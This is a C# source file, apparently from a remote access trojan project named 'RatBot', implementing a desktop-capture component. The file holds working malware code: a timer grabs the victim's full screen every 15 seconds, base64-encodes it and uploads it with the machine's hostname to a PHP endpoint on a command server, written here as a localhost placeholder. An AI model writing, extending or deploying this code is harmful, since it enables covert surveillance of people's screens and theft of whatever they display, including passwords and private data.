﻿using System;

using System.Drawing;

using System.Windows.Forms;


using System.IO; //MemoryStream
using System.Drawing.Imaging; //For PixelFormat and ImageFormat

using System.Threading;
using System.Timers;
using System.Net;
using System.Text;
using System.Collections.Specialized;
using System.Windows.Media;

namespace RatBot
{
    internal class ClientDesktop
    {
        //-- reusing the webclient from Program class 
        //-- we need this to send the desktop capture to php script on server
        static WebClient webclient = Program.webClient;
        static bool isStarted = false;

        static Bitmap bitmap;
        static MemoryStream memoryStream;
        static Graphics memoryGraphics;
        static Rectangle rc;

        static string commands;

        static System.Timers.Timer timer = new System.Timers.Timer();

        static Thread th_CaptureDesktop;

        public static void initClientDesktop()
        {
            //-- for capturing and sending desktop.jpg to server
            timer.Interval = 15000;
            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
            timer.Enabled = true;
            timer.Start();

        }

        //-- called from Program main
        public static void StartDesktopCapture()
        {
            isStarted = true;
            Console.WriteLine("Desktop Capture started.");
        }

        //-- called from Program main
        public static void StopDesktopCapture()
        {

            isStarted = false;
            Console.WriteLine("Desktop Capture stopped.");
        }



        private static MemoryStream GetDesktop()
        {
            memoryStream = new MemoryStream(10000);
            try
            {
                rc = Screen.PrimaryScreen.Bounds;
                bitmap = new Bitmap(rc.Width, rc.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                memoryGraphics = Graphics.FromImage(bitmap);
                memoryGraphics.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
            }
            catch (Exception ex) { }
            // Bitmap to MemoryStream
            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            return memoryStream;
        }


        //--[ Send desktop capture to server ]--
        static void onTimedEvent(object sender, EventArgs e)
        {
            if (!isStarted) return;
            try
            {
                // For sending multiple arguments to the server 
                // since uploadValues function can only take two arguments: url to php script and argument to pass to the script
                NameValueCollection nameValues = new NameValueCollection();
                nameValues.Add("client", Dns.GetHostName());
                nameValues.Add("desktop64", Convert.ToBase64String(GetDesktop().ToArray()));


                webclient.UploadValues("http://127.0.0.1/senddesktop.php", nameValues);
            }
            catch (Exception)
            {
                Console.WriteLine("--error send desktop--");
            }
        }


    }
}
